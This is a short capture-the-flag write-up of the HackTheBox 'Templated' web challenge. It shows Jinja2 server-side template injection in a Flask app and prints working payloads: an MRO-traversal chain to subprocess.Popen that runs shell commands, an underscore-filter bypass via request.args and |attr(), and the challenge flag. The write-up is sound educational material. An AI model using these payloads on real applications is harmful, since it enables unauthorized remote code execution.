---
title: "HackTheBox - Templated (SSTI to RCE)"
description: "Server-side template injection in a Flask/Jinja2 app. Bypassed basic filters using attribute access chains to achieve remote code execution and read the root flag."
platform: "HackTheBox"
category: "Web"
difficulty: "Easy"
date: 2026-02-14
---

## Challenge Info

**Platform:** HackTheBox
**Category:** Web
**Difficulty:** Easy

## Recon

The app was basically empty, just a single route that reflected whatever you put in the URL back onto the page. The 404 message said:

```
Error: /whatever was not found on this server
```

The response headers showed `Werkzeug/1.0.1` which means Flask. I figured the page content was being rendered through a Jinja2 template, so I tried injecting a basic expression into the URL:

```
GET /{{7*7}}
```

The page returned `49`. That confirmed SSTI.

## Exploitation

From here I needed to get to a class that can run shell commands. In Python you can walk the MRO chain from any string to get to `object`, then list all its subclasses and find one like `subprocess.Popen`:

{% raw %}
```python
{{''.__class__.__mro__[1].__subclasses__()[OFFSET]('cat /flag.txt',shell=True,stdout=-1).communicate()}}
```
{% endraw %}

The tricky part is the index changes depending on the environment. I just iterated through them until one worked.

## Filter Bypass

The app was blocking underscores in the URL, which broke the payload. I worked around it by passing the attribute names as GET parameters instead:

{% raw %}
```
GET /{{request.args.c|attr(request.args.a)|attr(request.args.b)}}?c=''&a=__class__&b=__mro__
```
{% endraw %}

This keeps underscores out of the URL path entirely. You can chain the whole payload this way.

## Flag

```
HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
```

## What I learned

- If user input ends up inside a Jinja2 template, MRO traversal is a pretty reliable way to get RCE
- Simple character filters on the URL path are easy to bypass using `request.args` and `|attr()`
- Checking response headers early can tell you the framework before you even start fuzzing
